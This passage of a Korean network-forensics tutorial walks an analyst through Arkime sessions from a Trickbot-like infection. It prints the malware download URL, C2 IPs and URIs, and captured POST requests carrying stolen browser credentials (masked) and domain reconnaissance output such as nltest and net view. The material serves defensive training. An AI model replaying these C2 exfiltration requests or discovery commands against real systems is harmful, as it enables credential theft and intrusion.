Suspicious URIs: bolton-tech.com/YAS20.exe (1); 64.44.133.131/images/cursor.png (2), /images/imgpaper.png (1);
 203.176.135.102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ (4), /90 (1); checkip.amazonaws.com/ (1)
Unusual User-Agents: KSKJJGJ, WinHTTP loader/1.0, WinHttp.WinHttpRequest.5, MSIE 7.0 on Windows NT 10.0 (4)
```

---

## 7단계 — 후보를 시간 순서로 한 줄에 세우기 { #step-5 }

**목적:** 후보들을 **하나의 검색으로 모아서 시간 순서로 정렬**하면 공격 흐름(다운로드 → 실행 → C2)이 보입니다.

**쿼리:**

```text
host.http == bolton-tech.com || ip.dst == 64.44.133.131 || ip.dst == 203.176.135.102 || host.http == checkip.amazonaws.com
```

| 조각 | 뜻 |
|---|---|
| `host.http == bolton-tech.com` | HTTP Host 헤더가 bolton-tech.com인 세션 |
| <code>&#124;&#124;</code> | OR(또는). 이 중 **하나라도** 맞으면 보여줌. (`&&`는 둘 다, <code>&#124;&#124;</code>는 하나라도) |
| `ip.dst == 64.44.133.131` | 목적지 IP가 이것인 세션. 여기는 도메인이 없으니 IP로 찾음 |

일부러 **출발지 IP 조건은 넣지 않았습니다.** **누가(어떤 PC가)** 이 통신을 했는지를 결과로 확인하려는 것입니다.

Search → **Sessions** 탭 → **Start Time 오름차순**으로 정렬.

**실제 결과 (9개, 전부 10.3.11.194):**

```text
Start     Src IP:Port          Dst IP:Port            Packets  Bytes      Info
21:24:36  10.3.11.194:49727 → 50.87.248.17:80          389     488,507    bolton-tech.com/YAS20.exe
21:32:00  10.3.11.194:49787 → 18.235.112.207:80         11         950    checkip.amazonaws.com/
21:36:45  10.3.11.194:49816 → 64.44.133.131:80         979   1,218,352    /images/cursor.png  /images/imgpaper.png
21:36:52  10.3.11.194:50080 → 203.176.135.102:8082      11       1,396    /yas20/LAPTOP-7XMV2SN_.../81/
21:36:55  10.3.11.194:50081 → 203.176.135.102:8082      11       1,673    /yas20/LAPTOP-7XMV2SN_.../81/
21:36:57  10.3.11.194:50082 → 64.44.133.131:80         540     611,579    /images/cursor.png
21:36:59  10.3.11.194:50091 → 203.176.135.102:8082      19       6,771    /yas20/LAPTOP-7XMV2SN_.../90
21:37:19  10.3.11.194:50098 → 203.176.135.102:8082      11       1,341    /yas20/LAPTOP-7XMV2SN_.../81/
21:37:52  10.3.11.194:50099 → 203.176.135.102:8082      11       1,332    /yas20/LAPTOP-7XMV2SN_.../81/
```

**결과 읽기:** 9개 세션이 **전부 10.3.11.194 (LAPTOP-7XMV2SN, otis.witherspoon)** 한 대에서 나왔습니다. 감염 PC가 이 한 대로 좁혀졌습니다.

```text
21:24:36  YAS20.exe download          → bolton-tech.com (50.87.248.17:80)
   ↓ about 7 min 30 s later
21:32:00  public IP check             → checkip.amazonaws.com
   ↓ about 4 min 45 s later
21:36:45  two "png" downloads         → 64.44.133.131:80  (about 1.2 MB)
21:36:52  first POST /81/             → 203.176.135.102:8082
21:36:55  POST /81/
21:36:57  cursor.png again            → 64.44.133.131:80  (about 610 KB)
21:36:59  POST /90  (largest, ~2 min) → 203.176.135.102:8082
21:37:19  POST /81/
21:37:52  POST /81/   ← no more HTTP to these IPs until 22:06
```

이 순서는 전형적인 감염 흐름입니다. **① 악성 파일을 받고 → ② 실행되어 자기 위치를 확인하고 → ③ 추가 모듈을 받고 → ④ 공격자 서버에 정보를 보고**합니다.

### YAS20.exe 세션 상세 읽기 { #yas20 }

세션을 펼치면 아래쪽에 **Source**(PC가 보낸 것)와 **Destination**(서버가 보낸 것)이 나옵니다.

**1. 브라우저가 아니라 "스크립트"가 받았습니다.**

```http
GET /YAS20.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Host: bolton-tech.com
```

요청 헤더가 딱 4줄뿐입니다. 사람이 Edge에서 링크를 눌렀다면 `Referer`(어느 페이지에서 왔는지), `Accept-Language` 같은 헤더가 더 붙고, User-Agent도 `...Edg/80...`처럼 나왔을 겁니다. `WinHttp.WinHttpRequest.5`는 **VBScript, JScript, PowerShell, 오피스 매크로**가 파일을 받을 때 쓰는 윈도우 기능입니다. 그래서 **사용자가 악성 문서나 스크립트를 열었고, 그게 exe를 몰래 받아 온 것**으로 추정할 수 있습니다. 이게 **초기 침투(Initial Access)** 단서입니다.

**2. 서버 응답이 실행 파일입니다.**

```http
HTTP/1.1 200 OK
Date: Wed, 11 Mar 2020 21:24:36 GMT
Server: Apache
Last-Modified: Tue, 10 Mar 2020 11:32:37 GMT
Content-Length: 466944
host-header: c2hhcmVkLmJsdWVob3N0LmNvbQ==
Content-Type: application/x-msdownload
```

`Content-Type: application/x-msdownload`이고 `Content-Length: 466944`(약 456KB)입니다. `Last-Modified: 10 Mar 2020`이니까 **감염 하루 전에 서버에 올려 둔 파일**입니다.

**3. CyberChef 연습: 이상한 헤더 해독**

```text
host-header: c2hhcmVkLmJsdWVob3N0LmNvbQ==
```

끝이 `==`로 끝나는 건 **Base64**의 전형적인 모양입니다. CyberChef의 **From Base64**에 넣으면:

```text
shared.bluehost.com
```

**공유 웹호스팅 서비스**라는 뜻입니다. bolton-tech.com은 공격자가 만든 사이트라기보다 **해킹당해서 악성 파일 보관소로 쓰인 일반 사이트**일 가능성이 높습니다.

**티켓 기록:**

```text
[251117 2045, Analyst] Building timeline of suspicious HTTP sessions - Found

[251117 2045, Analyst] Query: host.http == bolton-tech.com || ip.dst == 64.44.133.131 || ip.dst == 203.176.135.102 || host.http == checkip.amazonaws.com -> 9 sessions, all from 10.3.11.194.
200311 21:24:36UTC 10.3.11.194 49727 50.87.248.17 80 GET 200 bolton-tech.com /YAS20.exe 1.1 Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
  No Referer. Response: Server Apache, Content-Type application/x-msdownload, Content-Length 466944, Last-Modified Tue, 10 Mar 2020 11:32:37 GMT, host-header c2hhcmVkLmJsdWVob3N0LmNvbQ== (From Base64 = shared.bluehost.com).
200311 21:32:00UTC 10.3.11.194 49787 18.235.112.207 80 GET checkip.amazonaws.com / - public IP check 7.5 min after download
(... remaining 7 sessions as in the timeline above ...)
```

---

## 8단계 — 폐쇄망에서 판단하는 법과 CyberChef { #closed-network }

### 인터넷이 없을 때 { #offline }

실제 작전 환경은 대부분 폐쇄망입니다.

| 못 하는 것 | 대신 하는 것 |
|---|---|
| VirusTotal 해시 조회, 도메인·IP 평판 조회, 검색 | **트래픽에 보이는 행동만으로 악성 여부를 판단** |

행동 근거의 예(이번 사례에서 쓴 것들):

- Body Magic이 `x-dosexec`이다 → 실행 파일을 받았다
- 도메인 없이 IP로, 비표준 포트(8082)로 접속했다
- URI에 PC 이름과 고유 ID가 들어 있다
- 외부로 POST(업로드)를 했다
- 브라우저가 아닌 이상한 User-Agent를 썼다
- 일정한 패턴으로 반복 접속하거나 연결을 오래 붙잡는다(비콘)

하나만으로는 약하지만, **여러 개가 같은 PC, 같은 시간대에 모이면 강한 근거**가 됩니다.

- **Body MD5는 그래도 기록합니다.** 지금 조회할 수는 없지만, 티켓의 IOC로 남기면 나중에 내부 위협 정보 DB나 악성코드 분석팀이 씁니다. *"Further malware analysis is required"*가 바로 이런 경우에 쓰는 문장입니다.
- 해당 세션은 **Download PCAP**으로 저장해서 증거(EVIDENCE LOCATIONS)로 남깁니다.
- 악성코드 이름은 분석가 지식으로 판단한 것이라 **"Trickbot-like pattern (unconfirmed)"**, **"consistent with Trickbot"**처럼 확정이 아닌 표현으로 씁니다.

### CyberChef로 할 수 있는 것 { #cyberchef }

| 쓰임 | 레시피 | 예 |
|---|---|---|
| POST로 올라간 데이터 해독 | **From Base64**, **URL Decode** | 인코딩된 본문을 읽을 수 있게 |
| 파일 정체 확인 | **Detect File Type**, **MD5 / SHA256** | 실행 파일이면 앞부분이 `MZ` |
| 숫자로 된 시간 읽기 | **From UNIX Timestamp**(단위 Milliseconds) | 아래 예 |
| 티켓용 IOC 무력화 | **Defang URL**, **Defang IP Addresses** | `zoomer.com` → `zoomer[.]com` |

URL에 이런 숫자가 자주 나옵니다(이번 데이터의 정상 트래픽에도 있었습니다).

```text
img.secureserver.net/t/1/tl/event?cts=1583961855884&...
```

`1583961855884`는 **UNIX 시간(밀리초)**입니다. From UNIX Timestamp(Milliseconds)에 넣으면:

```text
Wed 11 March 2020 21:24:15.884 UTC
```

데이터 시간대(21:22~22:06) 안에 들어옵니다. 이렇게 URL 안의 시간이 실제 세션 시간과 맞는지 교차 확인할 수 있습니다.

---

## 9단계 — 받은 파일: 종류와 해시 { #step-6 }

**목적:** 받은 세 파일이 정말 실행 파일인지, 해시는 무엇인지 확인합니다.

**쿼리:**

```text
host.http == bolton-tech.com || ip.dst == 64.44.133.131
```

**실제 결과 (SPI View → http):**

```text
Body Magic      application/x-dosexec (2)
Body Magic Cnt  1 (2)
Body MD5        179345004c39336eaba39863b95f268b (1)  9dfb3952172deeddb3a5e3cafed933bc (1)  e40d7846eae7d8a98c0e3512e5461e4c (1)
Body MD5 Cnt    1 (1)  2 (1)
```

"png" 세션의 Destination(서버 응답):

```http
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Wed, 11 Mar 2020 21:36:59 GMT
Content-Type: Content-type: application/octet-stream
Content-Length: 582656
Connection: keep-alive

imgpaper.png
```

```http
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Wed, 11 Mar 2020 21:37:06 GMT
Content-Type: Content-type: application/octet-stream
Content-Length: 582144
Connection: keep-alive

cursor.png
```

요청 쪽(Source):

```http
GET /images/cursor.png HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: WinHTTP loader/1.0
Host: 64.44.133.131
```

**결과 읽기 — "png" 두 개는 그림이 아닐 가능성이 매우 높습니다.**

- 크기가 `582656`, `582144` 바이트, 즉 **약 570KB**입니다. 마우스 커서 그림치고는 너무 큽니다.
- `Content-Type: Content-type: application/octet-stream`처럼 **헤더 이름이 두 번 들어간 엉터리 응답**입니다. 정상 웹서버는 이렇게 보내지 않으니 직접 만든 악성 서버의 특징입니다.
- 요청한 쪽 User-Agent가 `WinHTTP loader/1.0`입니다. 이름 그대로 "로더(다운로더) 프로그램"입니다.
- 응답 아래의 파란 `imgpaper.png`, `cursor.png`는 Arkime가 본문을 파일로 뽑아 준 링크입니다([11단계](#body-view) 참고).

!!! tip "바이트로 확인하기"
    진짜 PNG면 응답 본문이 `‰PNG`로 시작합니다. 실행 파일이면 이렇게 보입니다.

    ```text
    MZ......This program cannot be run in DOS mode.
    ```

    `MZ`와 `This program cannot be run in DOS mode`는 **윈도우 실행 파일(PE)의 지문**입니다. 본문을 내려받아 CyberChef **Detect File Type**에 넣어도 됩니다.

!!! note "MD5와 파일의 짝"
    MD5 3개가 각각 어느 파일인지는 SPI View로는 알 수 없습니다. 세션마다 HTTP 부분의 Body MD5를 열어 짝을 맞춥니다. 이번 분석에서는 짝을 맞추지 않았으므로 티켓에 "per-file mapping not confirmed"라고 적습니다.

**티켓 기록:**

```text
[251117 2105, Analyst] Collecting file type / Body MD5 of downloads from bolton-tech.com and 64.44.133.131 - Found

[251117 2105, Analyst] Query: host.http == bolton-tech.com || ip.dst == 64.44.133.131 -> 3 sessions.
Body Magic: application/x-dosexec (2).
Body MD5: 179345004c39336eaba39863b95f268b, 9dfb3952172deeddb3a5e3cafed933bc, e40d7846eae7d8a98c0e3512e5461e4c (per-file mapping not confirmed).
64.44.133.131 responses: Server nginx/1.6.2, malformed "Content-Type: Content-type: application/octet-stream".
 imgpaper.png Content-Length 582656; cursor.png Content-Length 582144. Request UA WinHTTP loader/1.0, Host = raw IP.
~570 KB "png" files from raw IP via downloader UA -> likely disguised executables.
```

---

## 10단계 — POST 확인과 업로드 방향 { #step-7 }

!!! question "질문: 21:36:59 세션이 POST라는 건 어떻게 알았나요?"
    솔직히, 그때는 **세션을 직접 열어 보고 안 게 아니라 숫자를 맞춰서 추론**한 것이었습니다. SPI View의 http 섹션에서 숫자 세 개가 맞아떨어졌습니다.

    ```text
    Request Method:            GET (39)   POST (5)
    http.request.content-type: multipart/form-data ... 5 values (1 each)
    URI:  .../81/ (4)   .../90 (1)    → total 5
    ```

    전체 HTTP 44개 중 **POST가 딱 5개**, 203.176.135.102로 간 URI도 **4 + 1 = 5개**, 업로드 형식도 **5개**. 다른 사이트들은 전부 그림·폰트·스크립트를 **받는**(GET) 요청이라 "이 5개가 POST다"라고 추정했습니다.

    하지만 이건 **추론**이지 증거가 아닙니다. **SPI View는 숫자만 셀 뿐 어느 세션이 POST인지 짝을 지어 주지 않습니다.** 세션 목록의 Info 칸에도 URI만 나오고 Method는 안 나옵니다. 티켓에 쓰기 전에는 반드시 직접 확인합니다.

    ```text
    http.method == POST
    ```

    | 조각 | 뜻 |
    |---|---|
    | `http.method` | HTTP 요청 방식 필드 |
    | `== POST` | POST인 것만 |

    결과가 **5개**이고 전부 `10.3.11.194 → 203.176.135.102:8082`이면 추론이 맞은 겁니다. 다른 목적지가 섞여 나오면 그것도 조사 대상입니다. 이번 결과는 5개였고, 세션 상세에도 `Method POST (1)`이 나왔습니다.

**/90 세션 상세 (21:36:59):**

```text
Time          2020/03/11 21:36:59 UTC - 21:38:49 UTC
Src IP/Port   10.3.11.194 : 50091
Dst IP/Port   203.176.135.102 : 8082 { APNIC }
Src           Packets 10  Bytes 6,161  Databytes 5,609
Dst           Packets 9   Bytes 610    Databytes 120
TCP Flags     SYN 1  SYN-ACK 1  ACK 12  PSH 4  RST 0  FIN 2
HTTP          Method POST (1)  Status 200  User-Agent KSKJJGJ
              content-type multipart/form-data; boundary=aksgja8s8d8a8s97
              server Cowboy   response content-type text/plain
```

```http
POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/90 HTTP/1.1
Content-Type: multipart/form-data; boundary=aksgja8s8d8a8s97
User-Agent: KSKJJGJ
Host: 203.176.135.102:8082
Content-Length: 5366
Cache-Control: no-cache
```

```http
HTTP/1.1 200 OK
server: Cowboy
date: Wed, 11 Mar 2020 21:37:00 GMT
content-length: 3
Content-Type: text/plain

/1/
```

**결과 읽기:**

- **Src(PC → 서버) Databytes 5,609**, **Dst(서버 → PC) 120**. PC가 약 5.4KB(`Content-Length: 5366`)를 **올려 보냈고**, 서버는 `/1/`이라는 3바이트로 **"받았음"**이라고만 답했습니다. **방향을 보는 법:** Src와 Dst의 바이트를 비교해서 큰 쪽이 데이터를 보낸 쪽입니다.
- User-Agent `KSKJJGJ`는 의미 없는 글자라서 악성코드가 직접 넣은 값으로 보입니다.

**티켓 기록:**

```text
[251117 2110, Analyst] Inspecting POST /90 to 203.176.135.102:8082 for data upload - Found

[251117 2110, Analyst] /90 session: 200311 21:36:59-21:38:49 UTC 10.3.11.194 50091 203.176.135.102 {APNIC} 8082
POST .../90, User-Agent KSKJJGJ, multipart/form-data; boundary=aksgja8s8d8a8s97, Content-Length 5366.
Src 10 pkts 6,161 bytes (databytes 5,609) / Dst 9 pkts 610 bytes (databytes 120) -> upload.
Response: 200 OK, server Cowboy, text/plain, content-length 3, body "/1/" (acknowledgement).
```

---

## 11단계 — 업로드된 본문을 보는 법 { #body-view }

/90 세션의 Source 아래에는 본문 대신 파란 글씨로 **`90`**만 보입니다.

!!! question "질문: `natural`을 `ascii`로 바꿔도 파란 글씨 90만 보입니다."
    `natural` / `ascii` / `utf8` / `hex`는 **글자를 어떻게 표시할지**만 바꾸는 옵션이라서 그렇습니다. 본문을 파일 링크로 바꿔서 보여주는 건 **별도 설정**이 하고 있습니다.

    **방법 1: Packet Options에서 "Images & Files" 끄기**

    `natural` 오른쪽의 **Packet Options ▾** → **Hide Images & Files**(이미지·파일 숨기기). 버전에 따라 `Show Images & Files`에 체크가 되어 있는 형태일 수 있는데, 그러면 체크를 해제합니다. 이 옵션이 켜져 있으면 Arkime는 HTTP 본문을 **파일로 뽑아서 링크로만** 보여줍니다. 끄면 본문이 원래 바이트대로 펼쳐지고, 이 상태에서 `ascii`나 `hex`로 바꾸면 multipart 내용이 보입니다.

    **방법 2: Source Raw로 받아서 CyberChef로 보기**

    세션을 펼쳤을 때 맨 위 버튼 중 **Source Raw**를 누르면 **PC가 서버로 보낸 바이트 전체**(헤더 + 업로드 본문)가 파일 하나로 내려받아집니다. (**Destination Raw**는 서버가 PC로 보낸 쪽입니다.) CyberChef 오른쪽 위 Input 창의 **폴더 아이콘(Open file as input)**으로 열고, 깨져 보이면 Recipe에 **Strings**를 추가해 읽을 수 있는 글자만 뽑습니다.

    **방법 3:** 파란 `90` 링크를 직접 클릭해도 본문만 파일로 받을 수 있습니다. 같은 방법으로 CyberChef에서 엽니다.

---

## 12단계 — /90: 정찰 정보를 통째로 보냄 { #post-90 }

Hide Images & Files를 끄고 본 /90 본문입니다. 이번 분석에서 **가장 결정적인 증거**입니다. 암호화도 안 된 평문으로, **감염 PC가 자기 정보를 통째로 공격자에게 보낸 내용**이 그대로 보입니다.

### multipart 읽는 법 { #multipart }

multipart는 `--경계값`으로 칸을 나눕니다. 칸마다 `name="..."`이 붙어 있어서 무엇을 담았는지 알 수 있습니다.

```text
--aksgja8s8d8a8s97                                   ← boundary: start of part 1
Content-Disposition: form-data; name="proclist"      ← part name

(part 1 data)
--aksgja8s8d8a8s97                                   ← start of part 2
Content-Disposition: form-data; name="sysinfo"

(part 2 data)
--aksgja8s8d8a8s97--                                 ← boundary with -- at the end = last
```

### 묶음 1: `name="proclist"` — 실행 중인 프로세스 목록 { #proclist }

```text
***TASK LIST***

[System Process]
System
Registry
smss.exe
csrss.exe
wininit.exe
winlogon.exe
services.exe
lsass.exe
svchost.exe
...
MsMpEng.exe
NisSrv.exe
...
explorer.exe
...
VMMM;;;;영상ثافوزبت.exe
...
```

- 대부분은 정상 윈도우 프로세스입니다(`svchost.exe`, `lsass.exe`, `explorer.exe` 등). 공격자는 이 목록으로 **어떤 백신이 도는지, 분석 도구가 있는지** 확인합니다.
- `MsMpEng.exe`(Windows Defender)가 보입니다 → **Defender가 켜져 있었는데도 감염됐다**는 뜻입니다.
- 목록 중간의 **`VMMM;;;;영상ثافوزبت.exe`** — 영어, 한글, 아랍어가 섞인 말도 안 되는 이름입니다. 정상 윈도우 프로세스 중에 이런 이름은 없습니다. **악성코드 자신의 프로세스**일 가능성이 매우 높습니다. YAS20.exe가 실행된 뒤 이름을 바꿔서 숨은 것으로 보입니다. 이 이름은 나중에 호스트 조사팀이 Velociraptor 같은 도구로 PC를 확인할 때 쓸 **IOC**가 됩니다.

### 묶음 2: `name="sysinfo"` — 시스템·네트워크·도메인 정보 { #sysinfo }

```text
***S Y S T E M I N F O***

HostName: LAPTOP-7XMV2SN
OSName: Microsoft Windows 10 Pro
OSArchitecture: 64-bit
ProductType: Workstation
RegisteredOwner: admin
TotalPhysicalMemory: 6493 Mb

/c ipconfig /all
   Host Name . . . . . . . . . . . . : LAPTOP-7XMV2SN
   Primary Dns Suffix  . . . . . . . : mondogreek.com
   Physical Address. . . . . . . . . : B8-CA-3A-EC-3B-8F
   IPv4 Address. . . . . . . . . . . : 10.3.11.194(Preferred)
   Default Gateway . . . . . . . . . : 10.3.11.1
   DHCP Server . . . . . . . . . . . : 10.3.11.3
   DNS Servers . . . . . . . . . . . : 10.3.11.3

/c net config workstation
   Computer name                        \\LAPTOP-7XMV2SN
   User name                            otis.witherspoon
   Workstation domain                   MONDOGREEK

/c net view /all
   System error 6118 has occurred.
/c net view /all /domain
   System error 6118 has occurred.

/c nltest /domain_trusts
   0: MONDOGREEK mondogreek.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)
/c nltest /domain_trusts /all_trusts
   0: MONDOGREEK mondogreek.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)

***LOCAL MACHINE DATA***
User name: CN=Otis Witherspoon,CN=Users,DC=mondogreek,DC=com
Computer name: CN=LAPTOP-7XMV2SN,CN=Computers,DC=mondogreek,DC=com
Domain controller: Mondogreek-DC.mondogreek.com
Admin Name: Administrator
Admin Name: Administrator
Admin Name: Administrator
```

여기에는 악성코드가 PC에서 **명령어를 직접 실행한 결과**가 들어 있습니다. `/c`는 `cmd.exe /c 명령어` 형태로 실행했다는 흔적입니다.

| 명령 | 알아내는 것 |
|---|---|
| `ipconfig /all` | IP, 게이트웨이, DNS, MAC 주소 |
| `net config workstation` | 컴퓨터 이름, 로그인한 사용자, 도메인 |
| `net view /all` | 네트워크의 다른 컴퓨터 목록 (실패: error 6118 = "서버 목록을 얻을 수 없음") |
| `net view /all /domain` | 도메인 목록 (실패) |
| `nltest /domain_trusts` (`/all_trusts`) | 도메인 신뢰 관계 — 다른 도메인으로 넘어갈 길이 있는지 |
| LOCAL MACHINE DATA | 사용자·컴퓨터 계정 경로, **DC 이름**, **관리자 계정 이름** |

**교차 확인:** ipconfig에 나온 MAC `B8-CA-3A-EC-3B-8F`는 Arkime가 보여준 10.3.11.194의 Dell MAC `b8:ca:3a:ec:3b:8f`와 같습니다. **Arkime가 본 장비와 업로드 내용 속 장비가 같다**는 게 확인됩니다.

### 이게 왜 심각한가 { #why-serious }

`nltest /domain_trusts`와 관리자 계정 조회는 **"이 회사 네트워크가 얼마나 크고, 누가 관리자인가"**를 알아보는 명령입니다. 일반 사용자는 이걸 쓸 일이 거의 없습니다. 공격자가 **PC 한 대 감염에서 끝내지 않고 도메인 전체(DC)로 퍼질 준비**를 하고 있다는 신호입니다. 2020년 무렵 이런 정찰 뒤에는 랜섬웨어가 따라오는 경우가 많았습니다.

티켓에 쓸 공격 단계:

```text
Initial Access/Execution  21:24:36       script (WinHttp) downloads YAS20.exe
Discovery                 ~21:32-21:36   public IP check, process/system/network/domain info collected
Command & Control         21:36:52~      HTTP POST reports to 203.176.135.102:8082
Exfiltration              21:36:59-21:38:49  /90 POST, about 5.4 KB of cleartext recon data
```

샘플 티켓의 Exfil 체크리스트(시간, 무엇을, 바이트, 방법)를 이것으로 채울 수 있습니다.

**티켓 기록:**

```text
[251117 2115, Analyst] Reviewing content of POST /90 body for exfiltrated data - Found

[251117 2115, Analyst] /90 POST body (Packet Options > Hide Images & Files, ascii). Cleartext, 2 parts:
 name="proclist": "***TASK LIST***" full process list incl. MsMpEng.exe; anomalous process "VMMM;;;;영상ثافوزبت.exe" (likely malware process, host IOC)
 name="sysinfo": systeminfo; /c ipconfig /all; /c net config workstation; /c net view /all (/domain) - error 6118; /c nltest /domain_trusts (/all_trusts);
 LOCAL MACHINE DATA: user/computer DN, DC Mondogreek-DC.mondogreek.com, Admin Name: Administrator (x3).
 MAC in ipconfig matches Arkime Src Ethernet b8:ca:3a:ec:3b:8f.
Exfil of host/network/domain reconnaissance. ATT&CK T1057, T1082, T1016, T1482, T1087; T1041.
```

---

## 13단계 — /81/: 훔친 비밀번호 { #post-81 }

**목적:** `/81/` POST 4개에 무엇이 있는지 봅니다. 시간 순서상 /90보다 먼저 보낸 것이라 첫 보고(체크인)인지 다른 정보인지 확인합니다.

**쿼리:**

```text
ip.dst == 203.176.135.102 && http.uri == *81*
```

| 조각 | 뜻 |
|---|---|
| `http.uri` | 요청 URI 필드 |
| `*81*` | `*`는 "아무 글자나 몇 개든"이라는 와일드카드. "81이 들어간 URI" |

와일드카드가 안 먹히면 그냥 `ip.dst == 203.176.135.102`로 검색해서 Info에 `/81/`이 있는 줄을 펼치면 됩니다. Hide Images & Files 설정은 그대로 남아 있습니다.

### 첫 번째 /81/ (21:36:52) { #post-81-ie }

```http
POST /yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/ HTTP/1.1
Accept: */*
Content-Type: multipart/form-data; boundary=---------ATBOXLGQOOBDZTLA
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
Host: 203.176.135.102:8082
Content-Length: 274
Connection: Close
Cache-Control: no-cache

-----------ATBOXLGQOOBDZTLA
Content-Disposition: form-data; name="data"

https://www.facebook.com/|otis.witherspoon@mondogreek.com|P@ss********
-----------ATBOXLGQOOBDZTLA
Content-Disposition: form-data; name="source"

IE passwords
-----------ATBOXLGQOOBDZTLA--
```

(비밀번호는 이 페이지에서 가렸습니다.)

`data` 칸은 `|`로 구분된 세 덩어리입니다.

```text
https://www.facebook.com/          ← which site
otis.witherspoon@mondogreek.com    ← username
P@ss********                       ← password
```

`source` 칸의 `IE passwords`는 **"인터넷 익스플로러(Edge)에 저장된 비밀번호에서 꺼냈다"**는 뜻입니다. 즉 악성코드가 **브라우저에 저장된 비밀번호를 훔쳐서 평문 그대로 공격자 서버로 보냈습니다.** 서버는 이번에도 3바이트로 "받았음"만 답했습니다.

**왜 특히 위험한가:** 아이디가 회사 이메일(`@mondogreek.com`)입니다. 사용자가 회사 도메인 계정에도 **같은 비밀번호를 쓰고 있다면**, 공격자는 이제 도메인 계정으로 로그인할 수 있습니다. /90으로 DC 이름과 관리자 계정까지 가져갔으니 **측면 이동 준비가 다 된 상태**입니다. 그래서 티켓 권고에 **"계정 비밀번호 즉시 변경, 도메인 계정 재사용 여부 확인"**이 들어갑니다.

**다른 확인 포인트:**

- **User-Agent**가 `MSIE 7.0 ... Windows NT 10.0`입니다. 6단계에서 "Windows 10에서 IE7은 앞뒤가 안 맞는다, 숫자 4가 /81/ 4개와 같다"고 했던 그 값이 맞았습니다. 같은 악성코드 안에서도 **/90은 `KSKJJGJ`, /81/은 가짜 IE7**처럼 모듈마다 User-Agent가 다릅니다.
- 시간이 **21:36:52**라서 /90(21:36:59)보다 **먼저** 보냈습니다. 감염되자마자 비밀번호부터 훔쳐 갔습니다.

### 나머지 /81/ 3개 { #post-81-others }

| 시간 | Content-Length | 경계값 | `source` | `data` |
|---|---|---|---|---|
| 21:36:55 | 551 | `---------XWQEFTQLCLTQBJQE` | `firefox passwords` | Firefox 계정 토큰 + <code>https://accounts.firefox.com&#124;otis.witherspoon@mondogreek.com&#124;&lt;같은 비밀번호&gt;</code> + `No passwords found` |
| 21:37:19 | 219 | `---------MDLIZHCZZMRSOFHE` | `OpenVPN passwords and configs` | 비어 있음 |
| 21:37:52 | 210 | `---------TAGOVQVWGJFPBAJU` | `OpenSSH private keys` | 비어 있음 |

21:36:55의 `data`(토큰 값은 가림):

```text
chrome://FirefoxAccounts|<account id>|{"version":1,"accountData":{"keyFetchToken":"<masked>","unwrapBKey":"<masked>"}}
https://accounts.firefox.com|otis.witherspoon@mondogreek.com|P@ss********
No passwords found
```

**결과 읽기:**

```text
21:36:52  source: IE passwords                    → Facebook account + password stolen
21:36:55  source: firefox passwords               → Firefox account + password + login tokens stolen
21:37:19  source: OpenVPN passwords and configs   → data empty (nothing found)
21:37:52  source: OpenSSH private keys            → data empty (nothing found)
```

- **`/81/` = "훔친 비밀번호 보고", `/90` = "정찰 정보 보고"**처럼 **URI 끝 번호가 데이터 종류를 뜻한다**는 것을 실제 내용으로 확인했습니다. 처음 URI만 봤을 때는 추측이었는데 이제 근거가 생겼습니다. 이 모듈은 **비밀번호를 훔치는 모듈이 "출처별로 한 번씩" 보고**하는 구조입니다.
- **비밀번호를 여러 곳에 똑같이 썼습니다.** Facebook과 Firefox 계정 비밀번호가 완전히 같습니다. 회사 도메인 계정 비밀번호도 같을 가능성이 높아 **도메인 계정 탈취 위험**을 티켓에 강하게 적어야 합니다.
- **비밀번호만이 아니라 "로그인 토큰"도 나갔습니다.** `keyFetchToken`, `unwrapBKey`는 Firefox 동기화 계정의 **인증 토큰과 암호화 키**입니다. 이게 있으면 비밀번호를 바꾸기 전까지 **동기화된 북마크, 기록, 저장된 비밀번호에 접근할 수도** 있습니다. 대응 권고에 "Firefox 계정 세션 강제 종료"가 들어갑니다.
- **비어 있는 보고도 의미가 있습니다.** OpenVPN, OpenSSH는 `data`가 비어 있습니다. 이 PC에는 VPN 설정이나 SSH 키가 **없어서 유출되지 않았다**는 뜻입니다. 티켓에 "시도했으나 데이터 없음"으로 적으면 대응팀이 VPN이나 SSH 키까지 교체할 필요가 없다는 걸 알 수 있습니다.

!!! danger "티켓 작성 팁: 비밀 정보 가리기"
    실제 업무에서 티켓에 비밀번호를 그대로 적으면 **티켓을 보는 모든 사람에게 비밀번호가 또 유출**됩니다. `P@ss********`처럼 일부를 가리고 "원문은 증거 PCAP 참조"라고 적습니다. 토큰 값도 마찬가지입니다.

**티켓 기록:**

```text
[251117 2120, Analyst] Reviewing content of POST /81/ body for exfiltrated data - Found
[251117 2125, Analyst] Reviewing remaining /81/ POSTs for credential sources - Found

[251117 2120, Analyst] 200311 21:36:52-21:36:54 UTC 10.3.11.194 50080 203.176.135.102 8082 POST .../81/
UA MSIE 7.0 on Windows NT 10.0, boundary ---------ATBOXLGQOOBDZTLA, Content-Length 274.
 name="data": https://www.facebook.com/|otis.witherspoon@mondogreek.com|P@ss******** (masked, full value in PCAP)
 name="source": IE passwords
Credential theft from browser store. ATT&CK T1555.003, T1041.

[251117 2125, Analyst] 21:36:55 :50081 Content-Length 551 source "firefox passwords" (Firefox account tokens + same password)
21:37:19 :50098 Content-Length 219 source "OpenVPN passwords and configs", data empty
21:37:52 :50099 Content-Length 210 source "OpenSSH private keys", data empty
Password reuse across sites -> high risk the domain password is the same. OpenVPN/OpenSSH: nothing stolen.
```

---

## 14단계 — 숨은 통신 찾기 1: 이상한 포트 { #step-8 }

